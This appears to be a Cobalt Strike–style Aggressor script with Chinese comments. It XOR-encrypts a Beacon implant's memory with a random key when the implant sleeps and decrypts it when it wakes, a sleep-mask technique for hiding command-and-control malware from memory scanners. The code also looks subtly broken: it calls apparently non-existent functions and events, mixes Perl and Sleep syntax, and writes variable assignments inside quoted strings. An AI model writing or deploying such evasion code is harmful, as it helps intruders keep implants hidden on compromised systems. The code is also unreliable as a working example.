# 全局变量用于保存加密密钥
local('$encryption_key');

# 自定义异或加密函数
sub custom_xor_encrypt {
    # 获取Beacon内存数据
    local('$beacon_data');
    $beacon_data = beacon_memory_dump();

    # 生成随机密钥
    local('$key_size = 16');
    local('$key');
    for (my $i = 0; $i < $key_size; $i++) {
        $key .= chr(int(rand(256)));
    }
    # 保存加密密钥
    $encryption_key = $key;

    # 执行异或加密
    for (my $i = 0; $i < length($beacon_data); $i++) {
        substr($beacon_data, $i, 1) = chr(ord(substr($beacon_data, $i, 1)) ^ ord(substr($key, $i % $key_size, 1)));
    }

    # 将加密后的数据写回Beacon内存
    beacon_memory_write($beacon_data);
}

# 自定义异或解密函数
sub custom_xor_decrypt {
    # 获取Beacon内存数据
    local('$beacon_data');
    $beacon_data = beacon_memory_dump();

    # 获取保存的加密密钥
    local('$key = $encryption_key');
    local('$key_size = length($key)');

    # 执行异或解密
    for (my $i = 0; $i < length($beacon_data); $i++) {
        substr($beacon_data, $i, 1) = chr(ord(substr($beacon_data, $i, 1)) ^ ord(substr($key, $i % $key_size, 1)));
    }

    # 将解密后的数据写回Beacon内存
    beacon_memory_write($beacon_data);
}

# 在Beacon睡眠时调用自定义加密函数
on beacon_sleep {
    custom_xor_encrypt();
}

# 在Beacon唤醒时调用自定义解密函数
on beacon_wake {
    custom_xor_decrypt();
}
